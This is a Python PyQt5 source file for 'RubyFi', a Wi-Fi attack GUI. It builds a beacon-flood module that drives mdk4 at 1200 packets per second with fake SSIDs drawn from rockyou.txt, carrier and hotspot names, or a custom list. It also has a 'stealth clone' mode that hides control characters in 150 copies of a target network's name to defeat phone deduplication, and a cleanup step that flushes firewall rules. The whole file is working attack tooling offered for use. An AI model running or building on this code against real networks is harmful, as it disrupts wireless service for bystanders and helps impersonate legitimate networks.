#!/usr/bin/env python3
"""
gui/beacon_flood_dialog.py
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
RubyFi — Beacon Flood background thread + mode dialog + live view.

Drop this file into gui/ then make three edits in main_window.py:
  1. from gui.beacon_flood_dialog import BeaconFloodMixin
  2. class RubyFiWindow(DeauthMixin, EvilTwinMixin, BeaconFloodMixin, QMainWindow):
  3. In show_attack_menu() attacks list add:
         ("5️⃣ Beacon Flood", "beacon_flood", "#e040fb"),
  4. In handle_attack_selection() add:
         elif attack_type == "beacon_flood": self.execute_beacon_flood()
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""

import os
import time
import subprocess
from typing import Optional

from PyQt5.QtCore  import QThread, pyqtSignal, Qt
from PyQt5.QtWidgets import (
    QDialog, QVBoxLayout, QHBoxLayout, QPushButton, QLabel,
    QTextEdit, QLineEdit, QFileDialog, QFrame
)
from PyQt5.QtGui import QFont


# ═══════════════════════════════════════════════════════════════════
# BACKGROUND THREAD
# ═══════════════════════════════════════════════════════════════════

class BeaconFloodThread(QThread):
    """
    Runs the full Beacon Flood pipeline in a background thread.

    Signals
    -------
    statusupdate(str)            — one log line
    phasechanged(str, str)       — (label_text, hex_colour)
    statsupdate(int, int, str)   — (elapsed_s, ssid_count, flood_channel)
    attackcomplete(bool, str)    — (success, message)
    """

    statusupdate   = pyqtSignal(str)
    phasechanged   = pyqtSignal(str, str)
    statsupdate    = pyqtSignal(int, int, str)
    attackcomplete = pyqtSignal(bool, str)

    TEMP_WORDLIST = "/tmp/rubyfi_ssids.txt"

    def __init__(self, interface: str, mode: str,
                 target_ssid: Optional[str]    = None,
                 target_channel: Optional[str] = None,
                 custom_wordlist: Optional[str] = None):
        super().__init__()
        self.interface       = interface
        self.mode            = mode          # "rockyou"|"clone"|"custom"|"maxvis"
        self.target_ssid     = target_ssid or ""
        self.target_channel  = str(target_channel) if target_channel else None
        self.custom_wordlist = custom_wordlist
        self.running         = True
        self._process        = None
        self.start_time      = None
        self.ssid_count      = 0
        self.flood_channel   = "6"

    # ── tiny helpers ────────────────────────────────────────────────

    def _s(self, msg: str):
        self.statusupdate.emit(msg)

    def _phase(self, text: str, colour: str = "#00d4ff"):
        self.phasechanged.emit(text, colour)

    def _emit_stats(self):
        elapsed = int(time.time() - (self.start_time or time.time()))
        self.statsupdate.emit(elapsed, self.ssid_count, self.flood_channel)

    # ── sub-routines ────────────────────────────────────────────────

    def _cleanup_previous(self):
        self._phase("🧹 CLEANING UP", "#00d4ff")
        self._s("Terminating conflicting processes …")
        for proc in ["mdk4", "airbase-ng", "wifiphisher",
                     "hostapd", "dnsmasq", "lighttpd", "aireplay-ng"]:
            subprocess.run(f"pkill -f {proc}", shell=True, capture_output=True)
        for i in range(5):
            subprocess.run(f"ip link set at{i} down 2>/dev/null",
                           shell=True, capture_output=True)
        subprocess.run("iptables -t nat -F 2>/dev/null", shell=True, capture_output=True)
        subprocess.run("iptables -F 2>/dev/null",        shell=True, capture_output=True)
        time.sleep(2)
        self._s("✓ Environment clean")

    def _lock_channel(self, channel: str):
        try:
            subprocess.run(
                ["iw", "dev", self.interface, "set", "channel", channel],
                capture_output=True, check=True
            )
            self._s(f"✓ Locked {self.interface} → channel {channel}")
        except Exception as e:
            self._s(f"⚠ iw failed ({e}) — trying iwconfig …")
            subprocess.run(
                f"iwconfig {self.interface} channel {channel}",
                shell=True, capture_output=True
            )

    def _resolve_channel(self) -> str:
        if self.mode == "maxvis":
            return "6"
        if self.target_channel:
            try:
                ch = int(self.target_channel)
                if ch > 14:
                    self._s(f"⚠ Target CH {ch} is 5GHz — falling back to CH 6 (2.4GHz)")
                    return "6"
                return self.target_channel
            except ValueError:
                return "6"
        return "6"

    # ── wordlist generators ──────────────────────────────────────────

    def _prepare_rockyou(self, limit: int = 500) -> Optional[str]:
        raw = "/usr/share/wordlists/rockyou.txt"
        if not os.path.exists(raw):
            self._s(f"✖ {raw} not found — install wordlists package")
            return None
        try:
            ssids: set = set()
            with open(raw, "r", errors="ignore") as f:
                for line in f:
                    clean = line.strip()
                    if 0 < len(clean) <= 32:
                        ssids.add(clean)
                    if len(ssids) >= limit:
                        break
            with open(self.TEMP_WORDLIST, "w") as f:
                f.write("\n".join(ssids))
            self._s(f"✓ Prepared {len(ssids)} SSIDs from rockyou.txt")
            return self.TEMP_WORDLIST
        except Exception as e:
            self._s(f"✖ rockyou prepare error: {e}")
            return None

    def _prepare_clone(self) -> Optional[str]:
        if not self.target_ssid:
            self._s("✖ No target SSID set — cannot generate clones")
            return None
        self._s(f"Generating 150 stealth clones of \"{self.target_ssid}\" …")
        # RS (\x1e) and US (\x1f) are non-printing chars that bypass deduplication
        stealth_ssids = []
        for i in range(1, 151):
            char = "\x1e" if i % 2 == 0 else "\x1f"
            stealth_ssids.append(f"{self.target_ssid}{char}{i}")
        try:
            with open(self.TEMP_WORDLIST, "w") as f:
                f.write("\n".join(stealth_ssids))
            self._s(f"✓ {len(stealth_ssids)} stealth SSIDs ready")
            return self.TEMP_WORDLIST
        except Exception as e:
            self._s(f"✖ Clone generation error: {e}")
            return None

    def _prepare_maxvis(self) -> Optional[str]:
        base_names = [
            "FREE_WIFI", "Jio_WiFi", "Airtel_4G", "BSNL_Broadband",
            "Hotel_Guest", "Airport_WiFi", "Coffee_WiFi", "School_WiFi",
            "Office_WiFi", "Home_Network", "AndroidAP", "iPhone_Hotspot",
            "TP-Link_Guest", "Netgear_Guest", "DLink_Guest", "ASUS_Guest",
            "Reliance_Jio", "Vodafone_WiFi", "Idea_Network", "BSNL_WiFi",
            "Public_WiFi", "Free_Internet", "Open_WiFi",
        ]
        visible: list = []
        if self.target_ssid:
            for i in range(1, 50):
                visible.append(f"{self.target_ssid}_{i}")
                visible.append(f"{self.target_ssid}_2G_{i}")
                visible.append(f"{self.target_ssid}_EXT_{i}")
        for name in base_names:
            for i in range(1, 6):
                visible.append(f"{name}_{i}")
        try:
            sample = visible[:500]
            with open(self.TEMP_WORDLIST, "w") as f:
                f.write("\n".join(sample))
            self._s(f"✓ Generated {len(sample)} max-visibility SSIDs")
            return self.TEMP_WORDLIST
        except Exception as e:
            self._s(f"✖ MaxVis generation error: {e}")
            return None

    # ── cleanup on exit ─────────────────────────────────────────────

    def _stop_flood(self):
        if self._process and self._process.poll() is None:
            try:
                self._process.terminate()
                self._process.wait(timeout=3)
            except Exception:
                pass
        subprocess.run(["pkill", "-9", "mdk4"], capture_output=True)
        if os.path.exists(self.TEMP_WORDLIST):
            try:
                os.remove(self.TEMP_WORDLIST)
            except Exception:
                pass

    def stop(self):
        self.running = False
        self._stop_flood()

    # ── MAIN THREAD ENTRY ────────────────────────────────────────────

    def run(self):
        try:
            # PHASE 0 — cleanup
            self._cleanup_previous()
            if not self.running:
                self.attackcomplete.emit(False, "Stopped by user")
                return

            # PHASE 1 — prepare wordlist
            self._phase("📝 PREPARING WORDLIST", "#ffbe0b")
            wordlist_path: Optional[str] = None

            if self.mode == "rockyou":
                wordlist_path = self._prepare_rockyou()
            elif self.mode == "clone":
                wordlist_path = self._prepare_clone()
            elif self.mode == "maxvis":
                wordlist_path = self._prepare_maxvis()
            elif self.mode == "custom":
                wordlist_path = self.custom_wordlist
                if wordlist_path and os.path.exists(wordlist_path):
                    try:
                        with open(wordlist_path, "r", errors="ignore") as f:
                            n = sum(1 for ln in f if ln.strip())
                        self._s(f"✓ Custom wordlist loaded: {n} SSIDs")
                    except Exception:
                        self._s(f"✓ Custom wordlist: {wordlist_path}")
                else:
                    self._s(f"✖ Wordlist not found: {wordlist_path}")
                    self.attackcomplete.emit(False, "Custom wordlist not found")
                    return

            if not wordlist_path or not os.path.exists(wordlist_path):
                self.attackcomplete.emit(False, "Wordlist preparation failed")
                return

            try:
                with open(wordlist_path, "r", errors="ignore") as f:
                    self.ssid_count = sum(1 for ln in f if ln.strip())
            except Exception:
                self.ssid_count = 0

            if not self.running:
                self.attackcomplete.emit(False, "Stopped by user")
                return

            # PHASE 2 — lock channel
            self._phase("📡 LOCKING CHANNEL", "#00d4ff")
            self.flood_channel = self._resolve_channel()
            self._lock_channel(self.flood_channel)
            time.sleep(1)

            if not self.running:
                self.attackcomplete.emit(False, "Stopped by user")
                return

            # PHASE 3 — launch mdk4
            self._phase("📡 FLOOD ACTIVE", "#e040fb")
            cmd = [
                "mdk4", self.interface, "b",
                "-f", wordlist_path,
                "-m",               # disable internal channel hopping
                "-s", "1200",       # 1200 packets/second
                "-c", self.flood_channel,
            ]
            self._s(f"CMD ▶ {' '.join(cmd)}")
            self._s("━" * 52)
            self._s(f"✓  FLOOD LAUNCHED  ·  CH {self.flood_channel}  ·  {self.ssid_count} SSIDs  ·  1200 pkt/s")
            self._s("   Check phone WiFi list — allow 15–20 s to populate")
            self._s("   If nothing shows: disable 5GHz band on your phone")
            self._s("━" * 52)

            self._process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True,
                bufsize=1,
            )
            self.start_time = time.time()

            while self.running and self._process.poll() is None:
                try:
                    line = self._process.stdout.readline()
                    if line and line.strip():
                        self._s(line.strip())
                except Exception:
                    pass
                self._emit_stats()
                time.sleep(0.5)

            if not self.running:
                self.attackcomplete.emit(False, "Stopped by user")
            else:
                self.attackcomplete.emit(False, "mdk4 process exited")

        except Exception as e:
            self.attackcomplete.emit(False, str(e))
        finally:
            self._stop_flood()


# ═══════════════════════════════════════════════════════════════════
# MODE SELECTION DIALOG
# ═══════════════════════════════════════════════════════════════════

class BeaconFloodModeDialog(QDialog):
    """
    Four-mode picker shown before the attack starts.

    Attributes
    ----------
    selected_mode : str | None   "rockyou" | "clone" | "custom" | "maxvis"
    custom_path   : str | None   filled only when mode == "custom"
    """

    def __init__(self, target_ssid, target_bssid, target_channel,
                 interface, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Beacon Flood — Select Mode")
        self.setModal(True)
        self.setMinimumSize(600, 570)
        self.target_ssid    = target_ssid
        self.target_bssid   = target_bssid
        self.target_channel = target_channel
        self.interface      = interface
        self.selected_mode  = None
        self.custom_path    = None
        self._custom_armed  = False     # True once custom row is visible
        self._init_ui()

    def _init_ui(self):
        layout = QVBoxLayout(self)
        layout.setSpacing(4)
        layout.setContentsMargins(22, 22, 22, 22)

        # ── header ──────────────────────────────────────────────
        header = QLabel("📡  BEACON FLOOD ATTACK")
        header.setAlignment(Qt.AlignmentFlag.AlignCenter)
        header.setStyleSheet(
            "font-size:20px; font-weight:bold; color:#e040fb; margin:12px 0 4px 0;"
        )
        layout.addWidget(header)

        sub = QLabel(
            "Saturate the airwaves with hundreds of fake SSIDs — "
            "confuse, disrupt, or clone a target network"
        )
        sub.setAlignment(Qt.AlignmentFlag.AlignCenter)
        sub.setWordWrap(True)
        sub.setStyleSheet("color:#8b949e; font-size:11px; margin-bottom:10px;")
        layout.addWidget(sub)

        # ── target strip ─────────────────────────────────────────
        try:
            is_5ghz = int(self.target_channel) > 14
        except Exception:
            is_5ghz = False
        ch_warn = "  ⚠ 5GHz → will fall back to CH 6" if is_5ghz else ""
        info = QLabel(
            f"  🎯  {self.target_ssid}   ·   {self.target_bssid}"
            f"   ·   CH {self.target_channel}{ch_warn}"
        )
        info.setStyleSheet(
            "color:#c9d1d9; margin:0 0 8px 0; padding:10px;"
            "background:#0a0f1a; border-radius:6px; font-size:12px;"
            "border:1px solid #1a2640;"
        )
        layout.addWidget(info)

        # ── divider ──────────────────────────────────────────────
        div = QFrame()
        div.setFrameShape(QFrame.Shape.HLine)
        div.setStyleSheet("background:#1a2640; max-height:1px; margin:4px 0 10px 0;")
        layout.addWidget(div)

        # ── mode definitions ──────────────────────────────────────
        MODES = [
            (
                "1 · 📚  RockYou Wordlist  (500 optimised SSIDs)",
                "rockyou", "#00d4ff",
                "Samples 500 short strings from rockyou.txt — creates a broad, chaotic flood "
                "that fills the WiFi list with real-looking names",
            ),
            (
                f"2 · 👻  Stealth Clone  (150 invisible clones of '{self.target_ssid}')",
                "clone", "#e040fb",
                "Generates SSIDs appended with hidden RS/US control characters — "
                "phones display them as the original SSID, defeating deduplication",
            ),
            (
                "3 · 🔥  Maximum Visibility  (Force CH 6 · 2.4 GHz)",
                "maxvis", "#ff6b35",
                "Floods with universally recognisable names (Jio_WiFi, FREE_WIFI, "
                "Airport_WiFi…) on CH 6 — guaranteed to appear on all 2.4GHz phones",
            ),
            (
                "4 · 📂  Custom Wordlist  (your own .txt file)",
                "custom", "#00ff88",
                "Provide any text file with one SSID per line — total control over the flood content",
            ),
        ]

        self._mode_buttons: dict = {}

        for text, mode_id, colour, desc in MODES:
            btn = QPushButton(text)
            btn.setMinimumHeight(52)
            btn.setStyleSheet(f"""
QPushButton {{
    background: #0a0f1a;
    border: 2px solid {colour};
    color: {colour};
    font-size: 13px;
    font-weight: bold;
    text-align: left;
    padding-left: 18px;
    border-radius: 6px;
}}
QPushButton:hover  {{ background: {colour}; color: #05080f; }}
QPushButton:pressed{{ background: {colour}; color: #05080f; opacity: 0.85; }}
""")
            btn.clicked.connect(lambda _checked, m=mode_id: self._on_mode_btn(m))
            layout.addWidget(btn)
            self._mode_buttons[mode_id] = btn

            desc_lbl = QLabel(f"    {desc}")
            desc_lbl.setWordWrap(True)
            desc_lbl.setStyleSheet(
                "color:#8b949e; font-size:10px; margin:2px 4px 8px 4px;"
            )
            layout.addWidget(desc_lbl)

            # inline custom path row (hidden until mode 4 is clicked)
            if mode_id == "custom":
                self._custom_frame = QFrame()
                row = QHBoxLayout(self._custom_frame)
                row.setContentsMargins(0, 0, 0, 4)
                self._custom_edit = QLineEdit()
                self._custom_edit.setPlaceholderText("  Path to .txt wordlist file…")
                self._custom_edit.setStyleSheet("""
QLineEdit {
    background: #0a0f1a; border: 1px solid #1a2640;
    color: #c9d1d9; padding: 6px 10px;
    border-radius: 4px; font-size: 12px;
}
QLineEdit:focus { border: 1px solid #00ff88; }
""")
                browse_btn = QPushButton("Browse…")
                browse_btn.setFixedWidth(88)
                browse_btn.setStyleSheet("""
QPushButton {
    background: #0a0f1a; border: 1px solid #00ff88;
    color: #00ff88; padding: 6px; border-radius: 4px; font-size: 11px;
}
QPushButton:hover { background: #00ff88; color: #05080f; }
""")
                browse_btn.clicked.connect(self._browse_wordlist)
                launch_custom = QPushButton("▶ Launch")
                launch_custom.setFixedWidth(88)
                launch_custom.setStyleSheet("""
QPushButton {
    background: #00ff88; border: 1px solid #00ff88;
    color: #05080f; padding: 6px; border-radius: 4px;
    font-size: 11px; font-weight: bold;
}
QPushButton:hover { background: #00cc6a; }
""")
                launch_custom.clicked.connect(self._launch_custom)
                row.addWidget(self._custom_edit)
                row.addWidget(browse_btn)
                row.addWidget(launch_custom)
                self._custom_frame.setVisible(False)
                layout.addWidget(self._custom_frame)

        layout.addStretch()

        # ── cancel ───────────────────────────────────────────────
        cancel = QPushButton("✕  Cancel")
        cancel.setMinimumHeight(42)
        cancel.setStyleSheet("""
QPushButton {
    background: #0a0f1a; border: 2px solid #8b949e;
    color: #8b949e; font-size:13px; font-weight:bold;
    padding: 10px; border-radius: 6px;
}
QPushButton:hover { background: #8b949e; color: #05080f; }
""")
        cancel.clicked.connect(self.reject)
        layout.addWidget(cancel)

    def _browse_wordlist(self):
        path, _ = QFileDialog.getOpenFileName(
            self, "Select Wordlist", "",
            "Text Files (*.txt);;All Files (*)"
        )
        if path:
            self._custom_edit.setText(path)

    def _launch_custom(self):
        path = self._custom_edit.text().strip()
        if not path:
            self._custom_edit.setPlaceholderText("  ⚠ Please enter or browse a path first!")
            return
        self.custom_path    = path
        self.selected_mode  = "custom"
        self.accept()

    def _on_mode_btn(self, mode_id: str):
        if mode_id == "custom":
            if not self._custom_armed:
                self._custom_frame.setVisible(True)
                self._mode_buttons["custom"].setText(
                    "4 · 📂  Custom Wordlist  (fill path below ↓)"
                )
                self._custom_armed = True
            else:
                self._launch_custom()
        else:
            self.selected_mode = mode_id
            self.accept()


# ═══════════════════════════════════════════════════════════════════
# LIVE ATTACK DIALOG
# ═══════════════════════════════════════════════════════════════════

class BeaconFloodLiveDialog(QDialog):
    """
    Shown while the flood is running.
    Phase label · three stat pills · scrolling log · Stop button.
    """

    def __init__(self, thread: BeaconFloodThread, target_ssid: str,
                 target_channel: str, parent=None):
        super().__init__(parent)
        self.setWindowTitle("📡 Beacon Flood — Live")
        self.setModal(True)
        self.setMinimumSize(720, 600)
        self.thread         = thread
        self.target_ssid    = target_ssid
        self.target_channel = target_channel
        self._init_ui()
        self._wire()

    def _make_pill(self, text: str, colour: str) -> QLabel:
        lbl = QLabel(text)
        lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
        lbl.setMinimumHeight(42)
        lbl.setSizePolicy(
            lbl.sizePolicy().horizontalPolicy(),
            lbl.sizePolicy().verticalPolicy()
        )
        lbl.setStyleSheet(f"""
QLabel {{
    color: {colour};
    font-size: 14px;
    font-weight: bold;
    background: #0a0f1a;
    border-radius: 10px;
    border: 2px solid {colour};
    padding: 6px 18px;
    min-width: 120px;
}}
""")
        return lbl

    def _init_ui(self):
        layout = QVBoxLayout(self)
        layout.setSpacing(8)
        layout.setContentsMargins(22, 22, 22, 22)

        # ── header ──────────────────────────────────────────────
        hdr = QLabel("📡  BEACON FLOOD  —  LIVE")
        hdr.setAlignment(Qt.AlignmentFlag.AlignCenter)
        hdr.setStyleSheet(
            "font-size:18px; font-weight:bold; color:#e040fb;"
            "padding:12px; border-bottom:1px solid #1a2640; margin-bottom:6px;"
        )
        layout.addWidget(hdr)

        # ── phase label ──────────────────────────────────────────
        self.phase_label = QLabel("⚙  INITIALISING …")
        self.phase_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.phase_label.setMinimumHeight(58)
        self.phase_label.setStyleSheet("""
QLabel {
    color: #00d4ff;
    font-size: 22px;
    font-weight: bold;
    background: #0a0f1a;
    border-radius: 8px;
    padding: 10px;
    border: 2px solid #00d4ff;
    margin: 2px 0;
}
""")
        layout.addWidget(self.phase_label)

        # ── stats row ────────────────────────────────────────────
        stats_row = QHBoxLayout()
        stats_row.setSpacing(10)
        self._elapsed_pill = self._make_pill("⏱  0s",      "#00d4ff")
        self._ssid_pill    = self._make_pill("📡  0 SSIDs", "#e040fb")
        self._ch_pill      = self._make_pill("📶  CH  —",   "#ff6b35")
        for pill in [self._elapsed_pill, self._ssid_pill, self._ch_pill]:
            stats_row.addWidget(pill)
        layout.addLayout(stats_row)

        # ── tip strip ────────────────────────────────────────────
        tip = QLabel(
            "💡  Check your phone's WiFi list · Wait ~20 seconds · "
            "Disable 5GHz on phone if SSIDs are not appearing"
        )
        tip.setAlignment(Qt.AlignmentFlag.AlignCenter)
        tip.setWordWrap(True)
        tip.setStyleSheet(
            "color:#8b949e; font-size:11px; background:#0a0f1a;"
            "padding:8px; border-radius:6px; border:1px solid #1a2640; margin:4px 0;"
        )
        layout.addWidget(tip)

        # ── log ──────────────────────────────────────────────────
        log_hdr = QLabel("📋  ACTIVITY LOG")
        log_hdr.setStyleSheet(
            "color:#8b949e; font-size:11px; font-weight:bold; margin-top:4px;"
        )
        layout.addWidget(log_hdr)

        self.log_view = QTextEdit()
        self.log_view.setReadOnly(True)
        self.log_view.setFont(QFont("Courier New", 10))
        self.log_view.setStyleSheet("""
QTextEdit {
    background: #010409;
    border: 1px solid #1a2640;
    border-radius: 8px;
    color: #00d4ff;
    padding: 8px;
}
""")
        layout.addWidget(self.log_view)

        # ── stop / close button ──────────────────────────────────
        self.stop_btn = QPushButton("⏹  STOP FLOOD")
        self.stop_btn.setMinimumHeight(50)
        self.stop_btn.setStyleSheet("""
QPushButton {
    background: #0a0f1a;
    border: 2px solid #ff006e;
    color: #ff006e;
    font-size: 15px;
    font-weight: bold;
    border-radius: 8px;
}
QPushButton:hover { background: #ff006e; color: #05080f; }
""")
        self.stop_btn.clicked.connect(self._on_stop)
        layout.addWidget(self.stop_btn)

    def _wire(self):
        self.thread.statusupdate.connect(self._on_status)
        self.thread.phasechanged.connect(self._on_phase)
        self.thread.statsupdate.connect(self._on_stats)
        self.thread.attackcomplete.connect(self._on_complete)

    # ── signal slots ────────────────────────────────────────────────

    def _on_status(self, msg: str):
        import time as _t
        ts = _t.strftime("%H:%M:%S")
        if any(k in msg for k in ["✓", "✅", "ACTIVE", "LAUNCHED", "FLOOD"]):
            colour = "#00ff88"
        elif any(k in msg for k in ["✖", "⚠", "error", "Error", "failed", "not found"]):
            colour = "#ff006e"
        elif "━" in msg or "CMD ▶" in msg:
            colour = "#8b949e"
        else:
            colour = "#00d4ff"
        self.log_view.append(
            f'<span style="color:#8b949e;">[{ts}]</span> '
            f'<span style="color:{colour};">{msg}</span>'
        )
        sb = self.log_view.verticalScrollBar()
        sb.setValue(sb.maximum())

    def _on_phase(self, text: str, colour: str):
        self.phase_label.setText(text)
        self.phase_label.setStyleSheet(
            f"color:{colour}; font-size:22px; font-weight:bold;"
            f"background:#0a0f1a; border-radius:8px; padding:10px;"
            f"border:2px solid {colour}; margin:2px 0;"
        )

    def _on_stats(self, elapsed: int, ssid_count: int, channel: str):
        mins, secs = divmod(elapsed, 60)
        t_str = f"{mins}m {secs:02d}s" if mins else f"{elapsed}s"
        self._elapsed_pill.setText(f"⏱  {t_str}")
        self._ssid_pill.setText(f"📡  {ssid_count} SSIDs")
        self._ch_pill.setText(f"📶  CH {channel}")

    def _on_complete(self, success: bool, message: str):
        self.stop_btn.setText("✕  Close")
        self.stop_btn.setStyleSheet("""
QPushButton {
    background: #0a0f1a; border: 2px solid #8b949e;
    color: #8b949e; font-size:15px; font-weight:bold;
    border-radius: 8px;
}
QPushButton:hover { background: #8b949e; color: #05080f; }
""")
        self._on_status(f"Session ended — {message}")

    def _on_stop(self):
        if self.thread.isRunning():
            self.thread.stop()
            self.thread.wait(3000)
        self.accept()

    def closeEvent(self, event):
        if self.thread.isRunning():
            self.thread.stop()
            self.thread.wait(3000)
        super().closeEvent(event)


# ═══════════════════════════════════════════════════════════════════
# MIXIN — add to RubyFiWindow in main_window.py
# ═══════════════════════════════════════════════════════════════════

class BeaconFloodMixin:
    """
    Add to RubyFiWindow class definition:

        class RubyFiWindow(DeauthMixin, EvilTwinMixin, BeaconFloodMixin, QMainWindow):

    Requires:
        self.selected_target    (dict with ssid / bssid / channel)
        self.current_interface  (str)
        self.log(str)           (main window log method)
    """

    def execute_beacon_flood(self):
        target = self.selected_target
        iface  = self.current_interface

        if not target or not iface:
            self.log("❌ Beacon Flood: no target or interface set")
            return

        ssid    = target.get("ssid", "")
        bssid   = target.get("bssid", "")
        channel = target.get("channel", "6")

        # 1. mode selection dialog
        from gui.styles import DARK_THEME
        mode_dlg = BeaconFloodModeDialog(ssid, bssid, channel, iface, self)
        mode_dlg.setStyleSheet(DARK_THEME)
        if mode_dlg.exec() != QDialog.DialogCode.Accepted:
            self.log("📡 Beacon Flood cancelled")
            return

        selected_mode = mode_dlg.selected_mode
        custom_path   = mode_dlg.custom_path
        if not selected_mode:
            return

        mode_names = {
            "rockyou": "RockYou Wordlist",
            "clone":   "Stealth Clone",
            "maxvis":  "Maximum Visibility",
            "custom":  f"Custom ({custom_path})",
        }
        self.log(
            f"📡 Beacon Flood launched  ·  mode: {mode_names.get(selected_mode)}  "
            f"·  target: {ssid}  ·  CH {channel}"
        )

        # 2. create background thread
        thread = BeaconFloodThread(
            interface       = iface,
            mode            = selected_mode,
            target_ssid     = ssid,
            target_channel  = channel,
            custom_wordlist = custom_path,
        )

        # 3. live dialog (blocks until stopped)
        live_dlg = BeaconFloodLiveDialog(thread, ssid, channel, self)
        live_dlg.setStyleSheet(DARK_THEME)
        thread.start()
        live_dlg.exec()

        # 4. guarantee thread is dead
        if thread.isRunning():
            thread.stop()
            thread.wait(5000)

        self.log("📡 Beacon Flood session ended")
